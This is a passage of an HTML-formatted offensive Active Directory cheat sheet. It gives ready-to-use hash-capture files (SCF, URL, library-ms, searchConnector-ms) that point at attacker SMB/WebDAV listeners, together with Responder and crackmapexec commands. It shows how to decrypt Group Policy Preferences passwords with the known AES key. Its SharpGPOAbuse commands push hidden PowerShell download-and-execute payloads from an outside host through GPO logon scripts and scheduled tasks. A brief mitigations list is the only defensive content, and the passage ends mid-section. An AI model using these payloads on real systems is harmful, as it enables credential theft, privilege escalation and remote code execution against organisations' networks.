<a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a><span class="n">farmer</span><span class="p">.</span><span class="n">exe</span> <span class="n">8888</span> <span class="n">0</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">tmp</span> <span class="c"># undefinitely</span>
<a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a><span class="n">farmer</span><span class="p">.</span><span class="n">exe</span> <span class="n">8888</span> <span class="n">60</span> <span class="c"># one minute</span>
<a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>
<a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a><span class="c"># Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks</span>
<a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a><span class="n">crop</span><span class="p">.</span><span class="n">exe</span> <span class="p">&lt;</span><span class="n">output</span> <span class="n">folder</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">output</span> <span class="n">filename</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">WebDAV</span> <span class="n">server</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">LNK</span> <span class="n">value</span><span class="p">&gt;</span> <span class="no">[options]</span>
<a id="__codelineno-74-8" name="__codelineno-74-8" href="#__codelineno-74-8"></a><span class="n">Crop</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\\\</span><span class="n">fileserver</span><span class="p">\\</span><span class="n">common</span> <span class="n">mdsec</span><span class="p">.</span><span class="n">url</span> <span class="p">\\\\</span><span class="n">workstation</span><span class="nv">@8888</span><span class="p">\\</span><span class="n">mdsec</span><span class="p">.</span><span class="n">ico</span>
<a id="__codelineno-74-9" name="__codelineno-74-9" href="#__codelineno-74-9"></a><span class="n">Crop</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\\\</span><span class="n">fileserver</span><span class="p">\\</span><span class="n">common</span> <span class="n">mdsec</span><span class="p">.</span><span class="n">library-ms</span> <span class="p">\\\\</span><span class="n">workstation</span><span class="nv">@8888</span><span class="p">\\</span><span class="n">mdsec</span>
</code></pre></div>
<h3 id="scf-files">SCF Files</h3>
<p>Drop the following <code>@something.scf</code> file inside a share and start listening with Responder : <code>responder -wrf --lm -v -I eth0</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="no">[Shell]</span>
<a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a><span class="n">Command</span><span class="p">=</span><span class="n">2</span>
<a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a><span class="n">IconFile</span><span class="p">=\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">\</span><span class="n">Share</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">ico</span>
<a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a><span class="no">[Taskbar]</span>
<a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a><span class="n">Command</span><span class="p">=</span><span class="n">ToggleDesktop</span>
</code></pre></div>
<p>Using <a href="https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/slinky.py"><code>crackmapexec</code></a>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-M</span> <span class="n">scuffy</span> <span class="n">-o</span> <span class="n">NAME</span><span class="p">=</span><span class="n">WORK</span> <span class="n">SERVER</span><span class="p">=</span><span class="n">IP_RESPONDER</span> <span class="c">#scf</span>
<a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-M</span> <span class="n">slinky</span> <span class="n">-o</span> <span class="n">NAME</span><span class="p">=</span><span class="n">WORK</span> <span class="n">SERVER</span><span class="p">=</span><span class="n">IP_RESPONDER</span> <span class="c">#lnk</span>
<a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-M</span> <span class="n">slinky</span> <span class="n">-o</span> <span class="n">NAME</span><span class="p">=</span><span class="n">WORK</span> <span class="n">SERVER</span><span class="p">=</span><span class="n">IP_RESPONDER</span> <span class="n">CLEANUP</span>
</code></pre></div>
<h3 id="url-files">URL Files</h3>
<p>This attack also works with <code>.url</code> files and <code>responder -I eth0 -v</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="no">[InternetShortcut]</span>
<a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="n">URL</span><span class="p">=</span><span class="n">whatever</span>
<a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a><span class="n">WorkingDirectory</span><span class="p">=</span><span class="n">whatever</span>
<a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a><span class="n">IconFile</span><span class="p">=\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">\</span><span class="k">%</span><span class="n">USERNAME</span><span class="p">%.</span><span class="n">icon</span>
<a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a><span class="n">IconIndex</span><span class="p">=</span><span class="n">1</span>
</code></pre></div>
<h3 id="windows-library-files">Windows Library Files</h3>
<blockquote>
<p>Windows Library Files (.library-ms)</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="nt">&lt;libraryDescription</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;&lt;http://schemas.microsoft.com/windows/2009/library&gt;&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>@windows.storage.dll,-34582<span class="nt">&lt;/name&gt;</span>
<a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a><span class="w">  </span><span class="nt">&lt;version&gt;</span>6<span class="nt">&lt;/version&gt;</span>
<a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a><span class="w">  </span><span class="nt">&lt;isLibraryPinned&gt;</span>true<span class="nt">&lt;/isLibraryPinned&gt;</span>
<a id="__codelineno-78-6" name="__codelineno-78-6" href="#__codelineno-78-6"></a><span class="w">  </span><span class="nt">&lt;iconReference&gt;</span>imageres.dll,-1003<span class="nt">&lt;/iconReference&gt;</span>
<a id="__codelineno-78-7" name="__codelineno-78-7" href="#__codelineno-78-7"></a><span class="w">  </span><span class="nt">&lt;templateInfo&gt;</span>
<a id="__codelineno-78-8" name="__codelineno-78-8" href="#__codelineno-78-8"></a><span class="w">    </span><span class="nt">&lt;folderType&gt;</span>{7d49d726-3c21-4f05-99aa-fdc2c9474656}<span class="nt">&lt;/folderType&gt;</span>
<a id="__codelineno-78-9" name="__codelineno-78-9" href="#__codelineno-78-9"></a><span class="w">  </span><span class="nt">&lt;/templateInfo&gt;</span>
<a id="__codelineno-78-10" name="__codelineno-78-10" href="#__codelineno-78-10"></a><span class="w">  </span><span class="nt">&lt;searchConnectorDescriptionList&gt;</span>
<a id="__codelineno-78-11" name="__codelineno-78-11" href="#__codelineno-78-11"></a><span class="w">    </span><span class="nt">&lt;searchConnectorDescription&gt;</span>
<a id="__codelineno-78-12" name="__codelineno-78-12" href="#__codelineno-78-12"></a><span class="w">      </span><span class="nt">&lt;isDefaultSaveLocation&gt;</span>true<span class="nt">&lt;/isDefaultSaveLocation&gt;</span>
<a id="__codelineno-78-13" name="__codelineno-78-13" href="#__codelineno-78-13"></a><span class="w">      </span><span class="nt">&lt;isSupported&gt;</span>false<span class="nt">&lt;/isSupported&gt;</span>
<a id="__codelineno-78-14" name="__codelineno-78-14" href="#__codelineno-78-14"></a><span class="w">      </span><span class="nt">&lt;simpleLocation&gt;</span>
<a id="__codelineno-78-15" name="__codelineno-78-15" href="#__codelineno-78-15"></a><span class="w">        </span><span class="nt">&lt;url&gt;</span>\\\\workstation@8888\\folder<span class="nt">&lt;/url&gt;</span>
<a id="__codelineno-78-16" name="__codelineno-78-16" href="#__codelineno-78-16"></a><span class="w">      </span><span class="nt">&lt;/simpleLocation&gt;</span>
<a id="__codelineno-78-17" name="__codelineno-78-17" href="#__codelineno-78-17"></a><span class="w">    </span><span class="nt">&lt;/searchConnectorDescription&gt;</span>
<a id="__codelineno-78-18" name="__codelineno-78-18" href="#__codelineno-78-18"></a><span class="w">  </span><span class="nt">&lt;/searchConnectorDescriptionList&gt;</span>
<a id="__codelineno-78-19" name="__codelineno-78-19" href="#__codelineno-78-19"></a><span class="nt">&lt;/libraryDescription&gt;</span>
</code></pre></div>
<h3 id="windows-search-connectors-files">Windows Search Connectors Files</h3>
<blockquote>
<p>Windows Search Connectors (.searchConnector-ms)</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a><span class="nt">&lt;searchConnectorDescription</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;&lt;http://schemas.microsoft.com/windows/2009/searchConnector&gt;&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a><span class="w">    </span><span class="nt">&lt;iconReference&gt;</span>imageres.dll,-1002<span class="nt">&lt;/iconReference&gt;</span>
<a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a><span class="w">    </span><span class="nt">&lt;description&gt;</span>Microsoft<span class="w"> </span>Outlook<span class="nt">&lt;/description&gt;</span>
<a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a><span class="w">    </span><span class="nt">&lt;isSearchOnlyItem&gt;</span>false<span class="nt">&lt;/isSearchOnlyItem&gt;</span>
<a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a><span class="w">    </span><span class="nt">&lt;includeInStartMenuScope&gt;</span>true<span class="nt">&lt;/includeInStartMenuScope&gt;</span>
<a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a><span class="w">    </span><span class="nt">&lt;iconReference&gt;</span>\\\\workstation@8888\\folder.ico<span class="nt">&lt;/iconReference&gt;</span>
<a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a><span class="w">    </span><span class="nt">&lt;templateInfo&gt;</span>
<a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a><span class="w">        </span><span class="nt">&lt;folderType&gt;</span>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}<span class="nt">&lt;/folderType&gt;</span>
<a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a><span class="w">    </span><span class="nt">&lt;/templateInfo&gt;</span>
<a id="__codelineno-79-11" name="__codelineno-79-11" href="#__codelineno-79-11"></a><span class="w">    </span><span class="nt">&lt;simpleLocation&gt;</span>
<a id="__codelineno-79-12" name="__codelineno-79-12" href="#__codelineno-79-12"></a><span class="w">        </span><span class="nt">&lt;url&gt;</span>\\\\workstation@8888\\folder<span class="nt">&lt;/url&gt;</span>
<a id="__codelineno-79-13" name="__codelineno-79-13" href="#__codelineno-79-13"></a><span class="w">    </span><span class="nt">&lt;/simpleLocation&gt;</span>
<a id="__codelineno-79-14" name="__codelineno-79-14" href="#__codelineno-79-14"></a><span class="nt">&lt;/searchConnectorDescription&gt;</span>
</code></pre></div>
<h2 id="passwords-in-sysvol-group-policy-preferences">Passwords in SYSVOL &amp; Group Policy Preferences</h2>
<p>Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">S</span> <span class="p">/</span><span class="n">I</span> <span class="n">cpassword</span> <span class="p">\\&lt;</span><span class="n">FQDN</span><span class="p">&gt;\</span><span class="n">sysvol</span><span class="p">\&lt;</span><span class="n">FQDN</span><span class="p">&gt;\</span><span class="n">policies</span><span class="p">\*.</span><span class="n">xml</span>
</code></pre></div>
<p>Decrypt a Group Policy Password found in SYSVOL (by <a href="https://twitter.com/0x00C651E0/status/956362334682849280">0x00C651E0</a>), using the 32-byte AES key provided by Microsoft in the <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">MSDN - 2.2.1.1.4 Password Encryption</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;password_in_base64&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>enc<span class="w"> </span>-d<span class="w"> </span>-aes-256-cbc<span class="w"> </span>-K<span class="w"> </span>4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b<span class="w"> </span>-iv<span class="w"> </span><span class="m">0000000000000000</span>
<a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>
<a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>e.g:<span class="w"> </span>
<a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>enc<span class="w"> </span>-d<span class="w"> </span>-aes-256-cbc<span class="w"> </span>-K<span class="w"> </span>4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b<span class="w"> </span>-iv<span class="w"> </span><span class="m">0000000000000000</span>
<a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>
<a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>enc<span class="w"> </span>-d<span class="w"> </span>-aes-256-cbc<span class="w"> </span>-K<span class="w"> </span>4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b<span class="w"> </span>-iv<span class="w"> </span><span class="m">0000000000000000</span>
</code></pre></div>
<h3 id="automate-the-sysvol-and-passwords-research">Automate the SYSVOL and passwords research</h3>
<ul>
<li>
<p><code>Metasploit</code> modules to enumerate shares and credentials
    <div class="highlight"><pre><span></span><code><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_enumshares</span>
<a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_shares</span>
<a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">gpp</span>
</code></pre></div></p>
</li>
<li>
<p>CrackMapExec modules
    <div class="highlight"><pre><span></span><code><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="n">89</span><span class="p">[...]</span><span class="n">9d</span> <span class="n">-M</span> <span class="n">gpp_autologin</span>
<a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a><span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="n">89</span><span class="p">[...]</span><span class="n">9d</span> <span class="n">-M</span> <span class="n">gpp_password</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py">Get-GPPPassword</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="c"># with a NULL session</span>
<a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="nb">Get-GPPPassword</span><span class="p">.</span><span class="n">py</span> <span class="n">-no-pass</span> <span class="s1">&#39;DOMAIN_CONTROLLER&#39;</span>
<a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>
<a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a><span class="c"># with cleartext credentials</span>
<a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a><span class="nb">Get-GPPPassword</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;DOMAIN&#39;</span><span class="p">/</span><span class="s1">&#39;USER&#39;</span><span class="p">:</span><span class="s1">&#39;PASSWORD&#39;</span><span class="p">@</span><span class="s1">&#39;DOMAIN_CONTROLLER&#39;</span>
<a id="__codelineno-84-6" name="__codelineno-84-6" href="#__codelineno-84-6"></a>
<a id="__codelineno-84-7" name="__codelineno-84-7" href="#__codelineno-84-7"></a><span class="c"># pass-the-hash</span>
<a id="__codelineno-84-8" name="__codelineno-84-8" href="#__codelineno-84-8"></a><span class="nb">Get-GPPPassword</span><span class="p">.</span><span class="n">py</span> <span class="n">-hashes</span> <span class="s1">&#39;LMhash&#39;</span><span class="p">:</span><span class="s1">&#39;NThash&#39;</span> <span class="s1">&#39;DOMAIN&#39;</span><span class="p">/</span><span class="s1">&#39;USER&#39;</span><span class="p">:</span><span class="s1">&#39;PASSWORD&#39;</span><span class="p">@</span><span class="s1">&#39;DOMAIN_CONTROLLER&#39;</span>
</code></pre></div></p>
</li>
</ul>
<h3 id="mitigations_1">Mitigations</h3>
<ul>
<li>Install <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025">KB2962486</a> on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.</li>
<li>Delete existing GPP xml files in SYSVOL containing passwords.</li>
<li>Don’t put passwords in files that are accessible by all authenticated users.</li>
</ul>
<h2 id="exploit-group-policy-objects-gpo">Exploit Group Policy Objects GPO</h2>
<blockquote>
<p>Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</p>
</blockquote>
<p><img alt="🚩" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/1f6a9.svg" title=":triangular_flag_on_post:" /> GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p>
<p>GPO are stored in the DC in <code>\\&lt;domain.dns&gt;\SYSVOL\&lt;domain.dns&gt;\Policies\&lt;GPOName&gt;\</code>, inside two folders <strong>User</strong> and <strong>Machine</strong>.
If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at <code>Machine\Preferences\ScheduledTasks</code>.</p>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: <code>gpupdate /force</code>. </p>
<h3 id="find-vulnerable-gpo">Find vulnerable GPO</h3>
<p>Look a GPLink where you have the <strong>Write</strong> right.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;SuperSecureGPO&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span>  <span class="nb">Where-Object</span> <span class="p">{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span> <span class="o">-match</span> <span class="s2">&quot;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner&quot;</span><span class="p">)}</span>
</code></pre></div>
<h3 id="abuse-gpo-with-sharpgpoabuse">Abuse GPO with SharpGPOAbuse</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="c"># Build and configure SharpGPOAbuse</span>
<a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">FSecureLABS</span><span class="p">/</span><span class="n">SharpGPOAbuse</span>
<a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a><span class="p">$</span> <span class="nb">Install-Package</span> <span class="n">CommandLineParser</span> <span class="n">-Version</span> <span class="n">1</span><span class="p">.</span><span class="n">9</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">15</span>
<a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a><span class="p">$</span> <span class="n">ILMerge</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">out</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Release</span><span class="p">\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Release</span><span class="p">\</span><span class="n">CommandLine</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a>
<a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a><span class="c"># Adding User Rights</span>
<a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddUserRights</span> <span class="p">-</span><span class="n">-UserRights</span> <span class="s2">&quot;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight&quot;</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="n">bob</span><span class="p">.</span><span class="n">smith</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;Vulnerable GPO&quot;</span>
<a id="__codelineno-86-8" name="__codelineno-86-8" href="#__codelineno-86-8"></a>
<a id="__codelineno-86-9" name="__codelineno-86-9" href="#__codelineno-86-9"></a><span class="c"># Adding a Local Admin</span>
<a id="__codelineno-86-10" name="__codelineno-86-10" href="#__codelineno-86-10"></a><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddLocalAdmin</span> <span class="p">-</span><span class="n">-UserAccount</span> <span class="n">bob</span><span class="p">.</span><span class="n">smith</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;Vulnerable GPO&quot;</span>
<a id="__codelineno-86-11" name="__codelineno-86-11" href="#__codelineno-86-11"></a>
<a id="__codelineno-86-12" name="__codelineno-86-12" href="#__codelineno-86-12"></a><span class="c"># Configuring a User or Computer Logon Script</span>
<a id="__codelineno-86-13" name="__codelineno-86-13" href="#__codelineno-86-13"></a><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddUserScript</span> <span class="p">-</span><span class="n">-ScriptName</span> <span class="n">StartupScript</span><span class="p">.</span><span class="n">bat</span> <span class="p">-</span><span class="n">-ScriptContents</span> <span class="s2">&quot;powershell.exe -nop -w hidden -c \&quot;</span><span class="nb">IEX </span><span class="p">((</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.1.1.10:80/a&#39;</span><span class="p">))\</span><span class="s2">&quot;&quot;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;Vulnerable GPO&quot;</span>
<a id="__codelineno-86-14" name="__codelineno-86-14" href="#__codelineno-86-14"></a>
<a id="__codelineno-86-15" name="__codelineno-86-15" href="#__codelineno-86-15"></a><span class="c"># Configuring a Computer or User Immediate Task</span>
<a id="__codelineno-86-16" name="__codelineno-86-16" href="#__codelineno-86-16"></a><span class="c"># /!\ Intended to &quot;run once&quot; per GPO refresh, not run once per system</span>
<a id="__codelineno-86-17" name="__codelineno-86-17" href="#__codelineno-86-17"></a><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&quot;Update&quot;</span> <span class="p">-</span><span class="n">-Author</span> <span class="n">DOMAIN</span><span class="p">\</span><span class="n">Admin</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="p">-</span><span class="n">-Arguments</span> <span class="s2">&quot;/c powershell.exe -nop -w hidden -c \&quot;</span><span class="nb">IEX </span><span class="p">((</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.1.1.10:80/a&#39;</span><span class="p">))\</span><span class="s2">&quot;&quot;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;Vulnerable GPO&quot;</span>
<a id="__codelineno-86-18" name="__codelineno-86-18" href="#__codelineno-86-18"></a><span class="p">.\</span><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&quot;VULNERABLE_GPO&quot;</span> <span class="p">-</span><span class="n">-Author</span> <span class="s1">&#39;LAB.LOCAL\User&#39;</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&quot;EvilTask&quot;</span> <span class="p">-</span><span class="n">-Arguments</span>  <span class="s2">&quot;/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND &quot;</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="p">-</span><span class="n">-Force</span>
</code></pre></div>
<h3 id="abuse-gpo-with-powergpoabuse">Abuse GPO with PowerGPOAbuse</h3>
<ul>
<li>https://github.com/rootSySdk/PowerGPOAbuse</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.</span> <span class="p">.\</span><span class="n">PowerGPOAbuse</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>
<a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a><span class="c"># Adding a localadmin </span>
